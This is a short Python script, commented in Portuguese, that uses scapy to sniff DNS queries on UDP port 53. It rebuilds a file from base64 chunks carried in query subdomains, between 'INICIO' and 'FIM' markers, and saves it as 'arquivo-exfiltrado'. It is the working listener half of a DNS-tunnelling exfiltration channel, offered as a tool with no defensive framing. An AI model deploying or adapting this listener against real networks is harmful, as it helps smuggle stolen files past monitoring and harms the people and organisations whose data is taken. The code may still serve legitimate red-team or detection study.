from scapy.all import *
import base64, sys

received_data = ""

def packet_callback(packet):
    global received_data
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Se o pacote for uma consulta DNS
        qname = packet[DNSQR].qname.decode()  # Obtenha o nome da consulta
        subdomain = qname.split('.', 1)[0]  # Separe o subdomínio
        if subdomain == "INICIO":
            received_data = ""  # Comece a gravação de dados
            print(" ~ Iniciando a recepção de arquivo.")
        elif subdomain == "FIM":
            try:
                with open("arquivo-exfiltrado", "wb") as file:
                    file.write(base64.b64decode(received_data))  # Tente gravar o arquivo
                received_data = ""  # Limpe os dados recebidos para a próxima mensagem
                print(" ~ Arquivo exfiltrado para 'arquivo-exfiltrado'.")
                sys.exit()
            except Exception as e:
                print(f"Não foi possível decodificar: {received_data}\nErro: {e}")  # Se a decodificação falhar, imprima a string original
        else:
            received_data += subdomain

sniff(iface="wlp0s20f3", filter="udp port 53", prn=packet_callback, store=0)
